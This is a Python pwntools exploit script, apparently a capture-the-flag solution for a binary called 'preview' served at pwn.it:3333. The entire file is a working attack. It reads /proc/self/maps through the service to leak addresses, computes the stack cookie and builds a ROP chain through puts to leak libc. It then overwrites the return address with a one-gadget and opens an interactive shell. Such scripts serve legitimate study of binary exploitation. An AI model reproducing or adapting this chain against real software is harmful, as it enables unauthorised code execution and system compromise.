#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./preview"
elf=ELF(pwn_file)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
ld_address=0xffffffffffffffff
elf_address=0xfffffffffffffff
cookie=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("ld_address:0x%x"%ld_address)
    log.debug("elf address:0x%x"%elf_address)
    log.debug("cookie address:0x%x"%cookie)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("process pid:%d"%pid)
    pause()


conn.sendlineafter("Standing by for your requests\n","HEAD /proc/self/maps")
conn.recvuntil("Here's your preview:\n")
data=conn.recvlines(7)
for line in data:
    idx=line.find("-")
    add=int("0x"+line[:idx],16)
    if "ld" in line:
        if add < ld_address:
            ld_address=add 
    else:
        if add < elf_address:
            elf_address=add

cookie=(elf_address >> 4) | (ld_address << 24)

pop_rdi=elf_address+0x10b3

puts=0x9E0+elf_address
puts_got=0x202020+elf_address 
f={
    0x0:"H",
    0x58:p64(cookie),
    0x60:p64(0),
    0x68:p64(pop_rdi),
    0x70:p64(puts_got),
    0x78:p64(puts),
    0x80:p64(elf_address+0xFE8),
}

conn.sendline(fit(f,filler="\x00"))
conn.recvline()
libc.address=u64(conn.recvline(keepends=False).ljust(8,"\x00"))-libc.sym["puts"]
f={
        0:"H",
        0x58:p64(cookie),
        0x68:p64(libc.address+0x45216),
}
sleep(1)
conn.sendline(fit(f,filler="\x00"))
conn.interactive()

